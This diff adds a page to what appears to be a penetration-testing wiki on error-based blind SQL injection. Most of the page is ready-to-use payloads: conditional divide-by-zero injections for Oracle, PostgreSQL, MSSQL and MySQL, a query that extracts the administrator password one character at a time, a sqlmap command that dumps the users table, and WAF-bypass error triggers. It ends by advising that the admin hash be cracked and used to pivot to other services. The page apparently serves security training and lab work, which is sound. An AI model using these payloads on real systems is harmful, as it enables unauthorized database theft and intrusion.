@@ -1,0 +1,122 @@
+---
+title: Error-based Blind SQLi
+description: Extracting data when the only observable difference between true and false is whether the query throws a database error.
+mitre: [T1190, T1213]
+d3fend: [D3-MH, D3-NTA]
+impact: [DataExfil]
+owasp: [A05]
+noise: moderate
+sidebar:
+  order: 8
+  label: Blind (conditional errors)
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+The query output isn't reflected, the response body is identical for true and false conditions, and timing is unreliable - but the application returns a **distinguishable error** when the backend query fails. Force an error only when a condition is true, and the error itself becomes the boolean oracle.
+
+## TL;DR
+
+```sql
+-- Oracle: divide by zero only when the condition is TRUE → DB error
+' AND (SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+```
+
+If `<condition>` is true the query errors (HTTP 500, a custom error page, a stack trace); if false it returns normally. Everything else works like [boolean blind](../blind-boolean/) - binary-search each character - except the signal is "errored vs. didn't" instead of "content changed".
+
+## When to use
+
+| Symptom | Class |
+|---|---|
+| Errors printed with query output | [UNION-based](../union-based/) / error-based extraction |
+| Response differs on true vs. false condition | [Boolean blind](../blind-boolean/) |
+| Response only differs in timing | [Time-based blind](../blind-time/) |
+| Response identical, but a *condition-triggered error* changes it | **This page** |
+| No feedback of any kind | [Out-of-band](../out-of-band/) |
+
+This is the method PortSwigger's "conditional errors" lab tests. Reach for it when boolean content differences don't exist but you can still provoke a visible error state, and before falling back to slow time-based extraction.
+
+## Step 1 - Confirm the injection is interpreted as SQL
+
+A single quote may already throw an error. Prove the error is *SQL* (not generic input rejection) by submitting syntactically valid subqueries and watching the error appear and disappear:
+
+```sql
+'                        → error (unbalanced quote)
+''                       → no error
+'||(SELECT '')||'        → may still error depending on DBMS
+'||(SELECT '' FROM dual)||'   → no error on Oracle (needs a table)
+```
+
+<Aside type="note">
+On Oracle every `SELECT` needs a `FROM`, so `FROM dual` resolving the error is itself a fingerprint - it tells you the backend is Oracle. See [DBMS cheatsheet](../dbms-cheatsheet/) for the equivalent no-op table on each engine (`dual` on Oracle/MySQL, `FROM (SELECT 1) x` or none on PostgreSQL/MSSQL).
+</Aside>
+
+## Step 2 - Build the conditional error
+
+Pair a true/false condition with an expression that is only *evaluated* (and only errors) when the condition holds. Division by zero is the classic trigger.
+
+<Tabs syncKey="dbms">
+  <TabItem label="Oracle">
+    ```sql
+    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INT) ELSE 1 END)-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -
+    ```
+  </TabItem>
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' AND (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables), 1))-- -
+    ```
+  </TabItem>
+</Tabs>
+
+Swap `1=1` for `1=2` and the error must disappear. If both error or neither does, the trigger expression is being evaluated regardless of the condition - rework it so the erroring branch sits inside the `THEN`.
+
+## Step 3 - Extract character by character
+
+Replace the constant condition with a substring comparison, exactly as in [boolean blind](../blind-boolean/) - only the oracle changes from "content differs" to "errored":
+
+```sql
+' AND (SELECT CASE WHEN
+  (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a')
+  THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+```
+
+Error present → the character matches. Binary-search with `>`/`<` on `ASCII()`/`ORD()` to cut requests per character from ~94 to ~7, same algorithm as the boolean page.
+
+## Automation
+
+`sqlmap` detects and uses this technique automatically; restrict to it with `--technique=E`:
+
+```bash
+sqlmap -u "https://<TARGET>/page" --cookie="TrackingId=xyz*" \
+  --technique=E --dbms=oracle --dump -T users -C username,password
+```
+
+For manual control, the boolean-blind [ffuf and bash loops](../blind-boolean/#automation-with-ffuf) work unchanged - match on the error instead of response size, e.g. `ffuf ... -mc 500` to keep only responses that errored.
+
+## Common failure modes
+
+- **The error branch always fires.** Some engines evaluate both `CASE` branches during planning. Keep the erroring expression inside `THEN` and make the `ELSE` cheap (`NULL`, `1`); if that fails, move the trigger into a correlated subquery.
+- **Errors are swallowed.** If the app catches exceptions and returns 200 with a generic page, there's no oracle here - fall back to [time-based](../blind-time/).
+- **WAF blocks `1/0` or `CASE`.** See [Bypasses](../bypasses/); `CAST('x' AS INT)` or a subquery returning multiple rows (`(SELECT table_name FROM information_schema.tables)`) are alternative error triggers.
+
+## Notes
+
+- Capture one request/response pair showing the errored vs. clean state - it's clean evidence that the condition controlled the backend.
+- This technique leaks nothing in the response body, so it often slips past response-diffing detection while still being noisy in DB error logs. Note that asymmetry in the report.
+
+## Next move
+
+- **Error oracle confirmed** → automate with sqlmap `--technique=E`, or the boolean-blind scripts matched on status code
+- **Backend fingerprinted as Oracle via `FROM dual`** → use the [DBMS cheatsheet](/codex/web/sqli/dbms-cheatsheet/) for Oracle-specific schema queries (`all_tables`, `all_tab_columns`)
+- **No error oracle after all** → [Time-based blind](/codex/web/sqli/blind-time/), then [Out-of-band](/codex/web/sqli/out-of-band/) if timing is also unreliable
+- **Extracted an admin hash** → crack offline, then pivot to [MSSQL / WinRM / SSH](/codex/network/services/mssql/) on the same host
+- **Hardening this class out of an app** → [SQLi defense](/codex/web/sqli/defense/)
